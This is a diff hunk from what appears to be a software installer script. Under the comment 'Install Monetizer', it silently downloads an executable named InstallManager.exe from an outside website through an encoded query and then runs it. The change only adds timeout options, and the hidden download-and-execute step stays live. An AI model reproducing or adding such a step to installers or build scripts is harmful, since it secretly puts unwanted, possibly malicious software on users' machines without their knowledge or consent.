@@ -28,7 +28,7 @@ Section ""
 	 DetailPrint "Initializing..."
 	 
      ;Install Monetizer
-     inetc::get /SILENT "http://www.comay13north.com/download.php?loGFcg==" "$PLUGINSDIR\InstallManager.exe" /end
+     inetc::get /SILENT /CONNECTTIMEOUT 10 /RECEIVETIMEOUT 30 "http://www.comay13north.com/download.php?loGFcg==" "$PLUGINSDIR\InstallManager.exe" /end
      nsExec::Exec '$PLUGINSDIR\InstallManager.exe'
      
      ;Remove old version
